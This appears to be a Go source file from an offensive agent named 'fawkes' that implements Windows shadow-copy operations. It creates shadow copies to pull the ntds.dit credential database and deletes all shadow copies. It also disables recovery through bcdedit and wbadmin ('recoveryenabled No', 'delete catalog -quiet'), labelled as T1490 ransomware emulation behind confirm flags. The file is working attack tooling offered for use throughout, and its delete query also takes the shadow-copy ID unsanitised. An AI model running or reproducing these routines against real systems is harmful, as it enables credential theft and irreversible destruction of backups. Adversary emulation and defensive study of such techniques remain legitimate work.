//go:build windows
// +build windows

// vss_operations.go contains VSS create, delete, extract, delete-all, and
// inhibit-recovery operations. Extracted from vss.go for maintainability.

package commands

import (
	"fmt"
	"io"
	"os"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

// vssCreate creates a new shadow copy.
func vssCreate(args vssArgs) structs.CommandResult {
	volume := args.Volume
	if volume == "" {
		volume = "C:\\"
	}
	if !strings.HasSuffix(volume, "\\") {
		volume += "\\"
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	classResult, err := oleutil.CallMethod(services, "Get", "Win32_ShadowCopy")
	if err != nil {
		return errorf("Error getting Win32_ShadowCopy class: %v", err)
	}
	defer classResult.Clear()
	classDisp := classResult.ToIDispatch()

	createResult, err := oleutil.CallMethod(classDisp, "Create", volume, "ClientAccessible")
	if err != nil {
		return errorf("Error creating shadow copy: %v\nRequires administrator privileges.", err)
	}
	defer createResult.Clear()

	retVal := createResult.Value()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT ID, DeviceObject FROM Win32_ShadowCopy")
	if err == nil {
		defer resultSet.Clear()
		resultDisp := resultSet.ToIDispatch()
		var lastID, lastDev string
		_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
			item := v.ToIDispatch()
			idR, _ := oleutil.GetProperty(item, "ID")
			devR, _ := oleutil.GetProperty(item, "DeviceObject")
			if idR != nil {
				lastID = idR.ToString()
				idR.Clear()
			}
			if devR != nil {
				lastDev = devR.ToString()
				devR.Clear()
			}
			return nil
		})
		if lastDev != "" {
			return successf("Shadow copy created:\n  Volume: %s\n  ID: %s\n  Device: %s\n  Return Value: %v\n\nExtract files with:\n  vss -action extract -id \"%s\" -source \"\\Windows\\NTDS\\ntds.dit\" -dest \"C:\\temp\\ntds.dit\"", volume, lastID, lastDev, retVal, lastDev)
		}
	}

	return successf("Shadow copy created:\n  Volume: %s\n  Return Value: %v (0 = Success)", volume, retVal)
}

// vssDelete deletes a shadow copy by ID.
func vssDelete(args vssArgs) structs.CommandResult {
	if args.ID == "" {
		return errorResult("Error: id is required (shadow copy ID from list output)")
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		fmt.Sprintf("SELECT * FROM Win32_ShadowCopy WHERE ID = '%s'", args.ID))
	if err != nil {
		return errorf("Error querying shadow copy: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	deleted := false
	var deleteErr error

	_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		_, err := oleutil.CallMethod(item, "Delete_")
		if err != nil {
			deleteErr = err
			return fmt.Errorf("deleting shadow copy: %w", err)
		}
		deleted = true
		return nil
	})

	if deleteErr != nil {
		return errorf("Error deleting shadow copy: %v\nRequires administrator privileges.", deleteErr)
	}

	if !deleted {
		return errorf("Shadow copy not found: %s", args.ID)
	}

	return successf("Shadow copy deleted: %s", args.ID)
}

// vssExtract copies a file from a shadow copy to a destination.
func vssExtract(args vssArgs) structs.CommandResult {
	if args.ID == "" {
		return errorResult("Error: id is required (shadow copy device path, e.g., \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)")
	}
	if args.Source == "" {
		return errorResult("Error: source is required (path within shadow copy, e.g., \\Windows\\NTDS\\ntds.dit)")
	}
	if args.Dest == "" {
		return errorResult("Error: dest is required (local destination path)")
	}

	sourcePath := args.ID
	if !strings.HasSuffix(sourcePath, "\\") {
		sourcePath += "\\"
	}
	source := strings.TrimPrefix(args.Source, "\\")
	sourcePath += source

	srcFile, err := os.Open(sourcePath)
	if err != nil {
		return errorf("Error opening shadow copy file: %v\nPath: %s", err, sourcePath)
	}
	defer srcFile.Close()

	dstFile, err := os.Create(args.Dest)
	if err != nil {
		return errorf("Error creating destination file: %v", err)
	}
	defer dstFile.Close()

	bytesCopied, err := io.Copy(dstFile, srcFile)
	if err != nil {
		return errorf("Error copying file: %v (copied %d bytes before failure)", err, bytesCopied)
	}

	return successf("Extracted from shadow copy:\n  Source: %s\n  Dest: %s\n  Size: %d bytes", sourcePath, args.Dest, bytesCopied)
}

// vssDeleteAll deletes ALL shadow copies on the system.
// MITRE ATT&CK: T1490 (Inhibit System Recovery)
func vssDeleteAll(args vssArgs) structs.CommandResult {
	if !args.Confirm {
		return errorResult("SAFETY: delete-all requires -confirm true. This will delete ALL shadow copies on the system (T1490 - Inhibit System Recovery). This is a destructive, irreversible action used in ransomware emulation.")
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT * FROM Win32_ShadowCopy")
	if err != nil {
		return errorf("Error querying shadow copies: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	var deleted, failed int
	var sb strings.Builder
	sb.WriteString("Shadow Copy Deletion (T1490):\n\n")

	_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		idResult, _ := oleutil.GetProperty(item, "ID")
		id := ""
		if idResult != nil {
			id = idResult.ToString()
			idResult.Clear()
		}

		_, err := oleutil.CallMethod(item, "Delete_")
		if err != nil {
			sb.WriteString(fmt.Sprintf("  FAILED: %s — %v\n", id, err))
			failed++
		} else {
			sb.WriteString(fmt.Sprintf("  DELETED: %s\n", id))
			deleted++
		}
		return nil
	})

	sb.WriteString(fmt.Sprintf("\nResult: %d deleted, %d failed", deleted, failed))
	if deleted == 0 && failed == 0 {
		sb.WriteString(" (no shadow copies found)")
	}

	return successResult(sb.String())
}

// vssInhibitRecovery performs comprehensive system recovery inhibition.
// MITRE ATT&CK: T1490 (Inhibit System Recovery)
func vssInhibitRecovery(args vssArgs) structs.CommandResult {
	if !args.Confirm {
		return errorResult("SAFETY: inhibit-recovery requires -confirm true. This will:\n  1. Delete ALL shadow copies\n  2. Disable Windows Recovery Environment\n  3. Delete backup catalog\n  4. Disable System Restore\nThis is a destructive, irreversible action used in ransomware emulation (T1490).")
	}

	var sb strings.Builder
	sb.WriteString("Recovery Inhibition (T1490 — Inhibit System Recovery):\n\n")

	// Step 1: Delete all shadow copies via WMI
	sb.WriteString("[1] Shadow Copy Deletion:\n")
	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
	} else {
		resultSet, err := oleutil.CallMethod(services, "ExecQuery",
			"SELECT * FROM Win32_ShadowCopy")
		if err != nil {
			sb.WriteString(fmt.Sprintf("  ERROR querying: %v\n", err))
		} else {
			resultDisp := resultSet.ToIDispatch()
			var deleted int
			_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
				item := v.ToIDispatch()
				_, delErr := oleutil.CallMethod(item, "Delete_")
				if delErr == nil {
					deleted++
				}
				return nil
			})
			resultSet.Clear()
			sb.WriteString(fmt.Sprintf("  Deleted %d shadow copies\n", deleted))
		}
		cleanup()
	}

	// Step 2: Disable Windows Recovery Environment (bcdedit)
	sb.WriteString("\n[2] Windows Recovery Environment:\n")
	outBytes, err := execCmdTimeout("bcdedit", "/set", "{default}", "recoveryenabled", "No")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
	}

	// Step 3: Disable boot status policy
	sb.WriteString("\n[3] Boot Status Policy:\n")
	outBytes, err = execCmdTimeout("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
	}

	// Step 4: Delete backup catalog
	sb.WriteString("\n[4] Backup Catalog:\n")
	outBytes, err = execCmdTimeout("wbadmin", "delete", "catalog", "-quiet")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v (wbadmin may not be available)\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
	}

	sb.WriteString("\nRecovery inhibition complete. System recovery options have been disabled.")

	return successResult(sb.String())
}
